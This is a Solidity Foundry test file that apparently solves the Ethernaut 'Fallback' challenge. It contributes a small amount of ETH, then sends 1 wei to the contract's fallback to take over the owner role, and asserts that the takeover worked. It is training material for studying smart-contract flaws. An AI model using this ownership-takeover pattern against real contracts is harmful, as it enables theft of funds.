// SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "./utils/Utilities.sol";
import {console} from "./utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";
import {Fallback} from "../Fallback.sol";

contract FallbackTest is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);
    Fallback internal fallbackContract;

    Utilities internal utils;
    address payable[] internal users;
    address internal user;

    function setUp() public {
        utils = new Utilities();
        users = utils.createUsers(5);

        fallbackContract = new Fallback();

        user = users[1];

        vm.deal(user, 5 ether);
    }

    function testFallback() public {
        // owner should be the contract deployer.
        assertEq(fallbackContract.owner(), address(this));

        // set user as message sender.
        vm.startPrank(user);

        // contribute some eth.
        fallbackContract.contribute{value: 0.0001 ether}();

        // check the contribution.
        assertEq(fallbackContract.contributions(user), 0.0001 ether);

        // send some eth to the contract to claim ownership because you have contributed.
        payable(address(fallbackContract)).call{value: 1 wei}("");

        assertEq(fallbackContract.owner(), user);

        vm.stopPrank();
    }
}
